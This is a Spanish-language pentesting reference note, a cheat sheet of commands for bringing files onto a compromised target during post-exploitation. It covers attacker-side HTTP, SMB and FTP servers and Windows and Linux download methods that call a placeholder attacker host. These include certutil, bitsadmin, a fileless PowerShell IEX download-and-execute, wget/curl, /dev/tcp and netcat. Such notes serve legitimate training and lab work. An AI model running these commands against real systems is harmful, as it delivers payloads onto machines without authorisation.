---
tipo: meta
aliases:
  - Transferencia - matriz
  - file transfer cheatsheet
tags:
  - meta/referencia
  - dominio/post-explotacion
---

# Transferencia de archivos - matriz de referencia

> [!info] Referencia pura, no un zettel
> Comandos para **traer** un archivo al objetivo (ingress). El criterio —qué canal según el entorno— vive en [[MOC - Transferencia de archivos]] y [[Traer herramientas al objetivo]]. Para sacar datos, [[Exfiltración - matriz de referencia]]; para hablar con un servicio FTP puntual, [[FTP - matriz de referencia]].

`ATACANTE` es tu IP; `OBJETIVO` la víctima.

## Servir el archivo desde el box del atacante

Cuando el objetivo no tiene internet pero te alcanza a vos.

| Servidor | Comando |
|---|---|
| HTTP (Python) | `python3 -m http.server 80` |
| HTTP (PHP) | `php -S 0.0.0.0:80` |
| HTTP (Ruby) | `ruby -run -e httpd . -p 80` |
| SMB (Impacket) | `impacket-smbserver share . -smb2support` |
| SMB con credenciales | `impacket-smbserver share . -smb2support -user u -password p` |
| FTP (Python) | `python3 -m pyftpdlib -p 21 -w` |

SMB con credenciales fuerza SMBv3 y evita el modo abierto.

## Windows — traer

| Método | Comando |
|---|---|
| `certutil` (clásica, muy vigilada) | `certutil -urlcache -split -f http://ATACANTE/nc.exe c:\windows\temp\nc.exe` |
| PowerShell IWR (a disco) | `powershell -c "Invoke-WebRequest http://ATACANTE/f.exe -OutFile c:\temp\f.exe"` |
| PowerShell WebClient | `powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATACANTE/f.exe','c:\temp\f.exe')"` |
| PowerShell en memoria (fileless) | `powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATACANTE/s.ps1')"` |
| `bitsadmin` (segundo plano) | `bitsadmin /transfer job http://ATACANTE/f.exe c:\temp\f.exe` |
| `curl.exe` (Win10 1803+) | `curl http://ATACANTE/f.exe -o c:\temp\f.exe` |
| Copiar desde SMB del atacante | `copy \\ATACANTE\share\f.exe c:\temp\f.exe` |
| Ejecutar desde SMB directo | `\\ATACANTE\share\f.exe` |

## Linux — traer

| Método | Comando |
|---|---|
| `wget` | `wget http://ATACANTE/lin.elf -O /tmp/lin.elf` |
| `curl` | `curl http://ATACANTE/lin.elf -o /tmp/lin.elf` |
| bash puro por `/dev/tcp` (sin wget/curl) | `exec 3<>/dev/tcp/ATACANTE/80; echo -e "GET /f\r\n" >&3; cat <&3 >/tmp/f` |
| `nc` — receptor en el objetivo | `nc -lvnp 4444 > /tmp/f` (atacante: `nc ATACANTE 4444 < f`) |
| `scp` (si hay SSH) | `scp f user@OBJETIVO:/tmp/f` |

## Sin ninguna utilidad de red — base64 por copiar y pegar

Cuando solo hay una consola (shell restringida, sin salida de red).

| Paso | Comando |
|---|---|
| Codificar (atacante) | `base64 -w0 f` → copiar la cadena |
| Decodificar (objetivo Linux) | `echo 'BASE64' \| base64 -d > /tmp/f` |
| Decodificar (objetivo Windows) | `certutil -decode in.b64 out.exe` |

## Verificar que llegó entero

Comparar el hash a ambos lados antes de ejecutar.

| Sistema | Comando |
|---|---|
| Linux | `sha256sum f` |
| Windows (PowerShell) | `Get-FileHash f.exe -Algorithm SHA256` |
| Windows (sin PowerShell) | `certutil -hashfile f.exe SHA256` |

## Errores frecuentes

| Síntoma | Causa | Salida |
|---|---|---|
| `certutil` descarga 0 bytes | caché previa | agregar `-urlcache -split -f` |
| binario "corrupto" al ejecutar | transferencia en modo texto (FTP) | forzar binario, o verificar hash |
| SMB no monta desde Win10/11 | SMBv1 deshabilitado | `-smb2support` en el server |
| PowerShell IWR muy lento | barra de progreso | `$ProgressPreference='SilentlyContinue'` |
